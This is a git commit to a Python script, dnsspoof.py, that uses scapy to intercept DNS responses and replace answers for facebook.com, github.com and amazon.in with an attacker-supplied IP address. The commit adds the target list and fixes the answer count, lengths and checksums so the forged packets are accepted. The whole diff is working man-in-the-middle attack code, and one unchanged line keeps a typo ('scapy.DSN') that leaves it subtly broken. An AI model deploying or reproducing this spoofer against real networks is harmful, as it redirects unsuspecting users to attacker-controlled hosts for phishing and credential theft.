d6b042e08ccf410542091507c0f388d30f24bea1
gouthamk-cryptichub <k.goutham2000@gmail.com>
2020-08-24 03:41:21 -0400

    Resolved bug by modifying specific fields

--- dnsspoof.py
+++ dnsspoof.py
@@ -6,10 +6,17 @@ def see_packet(packet):
     use_packet = scapy.IP(packet.get_payload())
     if use_packet.haslayer(scapy.DNSRR):
         request_url = use_packet[scapy.DNSQR].qname
+        urls = ["facebook.com", "github.com", "amazon.in"]
         for url in urls:
             if url in request_url:
-                response = scapy.DNSRR(rrname= request_url, rdata= spoof_ip)
+                response = scapy.DNSRR(rrname=request_url, rdata=[spoof_ip])
                 use_packet[scapy.DSN].an = response
+
+                use_packet[scapy.DNS].ancount = 1
+                del use_packet[scapy.IP].len
+                del use_packet[scapy.IP].chksum
+                del use_packet[scapy.UDP].len
+                del use_packet[scapy.UDP].chksum
 
                 packet.set_payload(str(use_packet))
     packet.accept()
